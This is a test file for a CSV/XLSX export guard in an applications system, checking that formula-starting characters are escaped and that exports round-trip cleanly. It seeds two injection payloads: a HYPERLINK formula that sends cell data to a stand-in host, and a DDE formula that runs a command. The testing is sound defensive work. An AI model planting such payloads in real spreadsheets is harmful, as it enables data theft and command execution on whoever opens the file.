/*
 * Spreadsheet safety: what happens when a cell's text means something to Excel.
 *
 * Two distinct hazards share one fix:
 *   - an applicant-chosen legal name becoming a live formula in the admin's sheet
 *   - a nanoid app_id that begins with '-' being destroyed by Excel on re-save
 */
import { describe, it, expect, beforeAll, beforeEach } from 'vitest';
import { csvGuard, stripCsvGuard } from '@rp2/shared';

process.env.DATABASE_URL = ':memory:';
process.env.SESSION_SECRET = 'test-secret-that-is-long-enough-to-pass-zod';
process.env.EMAIL_TRANSPORT = 'console';

const { db } = await import('../src/db/client.js');
const schema = await import('../src/db/schema.js');
const { runMigrations } = await import('../src/db/migrate.js');
const { buildTemplate, previewImport } = await import('../src/services/offers.js');

const now = () => Math.floor(Date.now() / 1000);

function seedNamed(appId: string, legalName: string) {
  const uid = `u-${appId}`;
  db.insert(schema.user).values({ id: uid, email: `${uid}@example.com`, createdAt: now() }).run();
  db.insert(schema.application)
    .values({
      id: appId, applicantUserId: uid, status: 'submitted',
      createdAt: now(), updatedAt: now(), submittedAt: now(),
    })
    .run();
  db.insert(schema.applicationResponse)
    .values({
      applicationId: appId, questionKey: 'student_legal_name',
      value: JSON.stringify(legalName), updatedAt: now(),
    })
    .run();
}

beforeAll(() => {
  runMigrations();
});

beforeEach(() => {
  db.delete(schema.offer).run();
  db.delete(schema.applicationResponse).run();
  db.delete(schema.application).run();
  db.delete(schema.user).run();
});

describe('csvGuard', () => {
  it('neutralizes every character Excel reads as a formula start', () => {
    for (const lead of ['=', '+', '-', '@', '\t', '\r', '\n']) {
      expect(csvGuard(`${lead}danger`)).toBe(`'${lead}danger`);
    }
  });

  it('leaves ordinary text alone', () => {
    for (const s of ['Ada Lovelace', '750.00', '2026-09-19', '', "O'Brien", 'a-b']) {
      expect(csvGuard(s)).toBe(s);
    }
  });

  it('round-trips exactly', () => {
    for (const s of ['=HYPERLINK("x")', '-K9abc', '@home', 'Ada', "'tis", '']) {
      expect(stripCsvGuard(csvGuard(s))).toBe(s);
    }
  });

  it('does not eat an apostrophe the admin actually typed', () => {
    // Only a guard apostrophe is stripped — one followed by a formula char.
    expect(stripCsvGuard("'tis the season")).toBe("'tis the season");
    expect(stripCsvGuard("'Twas brillig")).toBe("'Twas brillig");
    expect(stripCsvGuard("'=formula")).toBe('=formula');
  });
});

describe('the exported template', () => {
  it('defuses a formula an applicant typed as their legal name', () => {
    seedNamed('app1', '=HYPERLINK("http://evil.test/"&A1,"CLICK ME")');
    const csv = buildTemplate('csv').toString('utf8');

    // The cell must not begin a formula once the quoting is stripped.
    expect(csv).toContain('"\'=HYPERLINK');
    expect(csv).not.toMatch(/,"=HYPERLINK/);
  });

  it('defuses the other classic payloads too', () => {
    seedNamed('app1', '@SUM(1+1)*cmd|\' /C calc\'!A0');
    const csv = buildTemplate('csv').toString('utf8');
    expect(csv).not.toMatch(/,"?@SUM/);
  });

  // ~1.8% of nanoid ids start with '-', which Excel evaluates and mangles.
  it('protects an app_id that begins with a dash', () => {
    seedNamed('-K9abcdefghijklmnopqr', 'Ada Lovelace');
    const csv = buildTemplate('csv').toString('utf8');
    expect(csv).toContain("'-K9abcdefghijklmnopqr");
  });

  it('still round-trips to zero changes with hostile content', () => {
    seedNamed('-K9abcdefghijklmnopqr', '=1+1');
    seedNamed('app2', '+Bobby Tables');
    const p = previewImport(buildTemplate('csv'), 'offers.csv');
    expect(p.fatal).toEqual([]);
    expect(p.errorRows).toEqual([]);
    expect(p.changedRows).toEqual([]);
    expect(p.unchangedCount).toBe(2);
  });

  it('round-trips hostile content through xlsx as well', () => {
    seedNamed('-K9abcdefghijklmnopqr', '=1+1');
    const p = previewImport(buildTemplate('xlsx'), 'offers.xlsx');
    expect(p.errorRows).toEqual([]);
    expect(p.changedRows).toEqual([]);
  });
});
